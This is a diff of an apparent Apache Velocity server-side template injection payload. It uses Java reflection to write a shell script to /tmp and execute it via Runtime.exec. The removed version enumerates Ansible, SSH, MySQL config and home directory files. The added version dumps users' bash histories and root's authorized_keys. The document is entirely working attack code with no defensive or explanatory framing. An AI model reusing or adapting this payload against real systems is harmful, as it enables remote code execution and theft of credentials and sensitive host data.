@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===ANSIBLE===; find /root/.ansible -type f 2>/dev/null | head -30; echo ===DRADMIN===; find /home/dradmin /home/druser -maxdepth 3 -type f 2>/dev/null | head -40; echo ===RCFG===; find /root/.config -type f 2>/dev/null | head -20; echo ===CNFFIND===; find / -maxdepth 5 -name '.my.cnf' 2>/dev/null | head -20; echo ===SSH===; ls -la /root/.ssh 2>&1 | head -10")
+$fw.write("echo ===DRADMIN_HIST===; tail -c 2500 /home/dradmin/.bash_history 2>&1; echo ===DRUSER===; tail -c 500 /home/druser/.bash_history 2>&1; echo ===ROOTKEYS===; cat /root/.ssh/authorized_keys 2>&1 | head -8")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
